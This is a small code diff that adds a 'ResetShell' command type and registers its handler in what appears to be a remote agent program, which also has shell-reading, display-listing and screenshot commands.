@@ -23,6 +23,8 @@ static const CHAR *CommandTypeName(UINT8 type)
         return "GetDisplays";
     case CommandType::Command_GetScreenshot:
         return "GetScreenshot";
+    case CommandType::Command_ResetShell:
+        return "ResetShell";
     default:
         return "Unknown";
     }
@@ -44,6 +46,7 @@ INT32 start()
     commandHandlers[CommandType::Command_ReadShell] = Handle_ReadShellCommand;
     commandHandlers[CommandType::Command_GetDisplays] = Handle_GetDisplaysCommand;
     commandHandlers[CommandType::Command_GetScreenshot] = Handle_GetScreenshotCommand;
+    commandHandlers[CommandType::Command_ResetShell] = Handle_ResetShellCommand;
 
     LOG_INFO("Agent starting, registered %d command handlers", (INT32)CommandType::CommandTypeCount);
 
